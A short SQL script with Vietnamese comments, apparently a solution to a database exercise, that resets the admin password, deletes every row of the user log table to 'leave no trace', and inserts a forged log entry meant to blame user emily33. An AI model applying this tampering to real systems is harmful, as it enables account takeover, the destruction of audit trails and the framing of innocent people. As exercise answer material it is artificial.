-- 1. Đổi mật khẩu admin thật sang hash của 'oops!'
UPDATE "users"
SET "password" = '982c0381c279d139fd221fce974916e7'
WHERE "username" = 'admin';

-- 2. Xóa sạch mọi dấu vết thực tế trong log (để vượt qua bước 'leaves no trace')
DELETE FROM "user_logs";

-- 3. Chèn log giả mạo: đổ tội cho emily33
-- Hash '44bf025d27eea66336e5c1133c3827f7' là hash chuẩn của emily33
INSERT INTO "user_logs" ("type", "old_username", "new_username", "old_password", "new_password")
VALUES ('update', 'admin', 'admin', 'e10adc3949ba59abbe56e057f20f883e', '44bf025d27eea66336e5c1133c3827f7');
